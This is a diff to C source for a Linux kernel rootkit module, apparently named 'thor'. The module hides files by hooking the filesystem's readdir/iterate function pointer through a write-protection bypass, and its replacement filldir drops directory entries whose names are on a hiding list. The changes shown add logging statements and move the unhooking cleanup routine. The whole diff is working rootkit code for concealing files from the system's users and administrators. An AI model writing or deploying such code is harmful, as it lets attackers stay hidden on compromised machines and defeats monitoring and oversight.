@@ -53,6 +53,8 @@ int filehider_init(void)
         return -1;
     }
 
+    LOG_INFO("hooking fs readdir / iterate");
+
     fs_fops = (struct file_operations*) filep_etc->f_op;
     filp_close(filep_etc, NULL);
 
@@ -70,6 +72,23 @@ int filehider_init(void)
 #endif
 
     return 0;
+}
+
+void filehider_cleanup(void)
+{
+    if (fs_fops != NULL && orig_fs_iterate != NULL) {
+        void *iterate_addr = orig_fs_iterate;
+
+        LOG_INFO("unhooking fs readdir / iterate");
+
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
+        write_no_prot(&fs_fops->readdir, &iterate_addr, sizeof(void*));
+#else
+        write_no_prot(&fs_fops->iterate, &iterate_addr, sizeof(void*));
+#endif
+    }
+
+    clear_file_list();
 }
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
@@ -108,8 +127,10 @@ static int thor_fs_filldir(void *buf, const char *name, int namelen,
 
     /* hide specified files */
     list_for_each_entry(tmp, &(file_list.list), list) {
-        if (strcmp(name, tmp->name) == 0)
+        if (strcmp(name, tmp->name) == 0) {
+            LOG_INFO("hiding file %s", name);
             return 0;
+        }
     }
 
     return orig_fs_filldir(buf, name, namelen, offset, ino, d_type);
@@ -118,6 +139,8 @@ static int thor_fs_filldir(void *buf, const char *name, int namelen,
 void add_to_file_list(const char *name, unsigned int len)
 {
     struct _file_list *tmp;
+
+    LOG_INFO("adding file %s to hiding list", name);
 
     tmp = (struct _file_list*) kmalloc(sizeof(struct _file_list), GFP_KERNEL);
     tmp->name = (char*) kmalloc(len, GFP_KERNEL);
@@ -135,6 +158,7 @@ void remove_from_file_list(const char *name, unsigned int len)
     list_for_each_safe(pos, q, &(file_list.list)) {
         tmp = list_entry(pos, struct _file_list, list);
         if (strncmp(tmp->name, name, len - 1) == 0) {
+            LOG_INFO("removing file %s from hiding list", name);
             list_del(pos);
             kfree(tmp->name);
             kfree(tmp);
@@ -147,24 +171,12 @@ void clear_file_list(void)
     struct _file_list *tmp;
     struct list_head *pos, *q;
 
+    LOG_INFO("clearing file hiding list");
+
     list_for_each_safe(pos, q, &(file_list.list)) {
         tmp = list_entry(pos, struct _file_list, list);
         list_del(pos);
         kfree(tmp->name);
         kfree(tmp);
     }
-}
-
-void filehider_cleanup(void)
-{
-    if (fs_fops != NULL && orig_fs_iterate != NULL) {
-        void *iterate_addr = orig_fs_iterate;
-#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
-        write_no_prot(&fs_fops->readdir, &iterate_addr, sizeof(void*));
-#else
-        write_no_prot(&fs_fops->iterate, &iterate_addr, sizeof(void*));
-#endif
-    }
-
-    clear_file_list();
 }
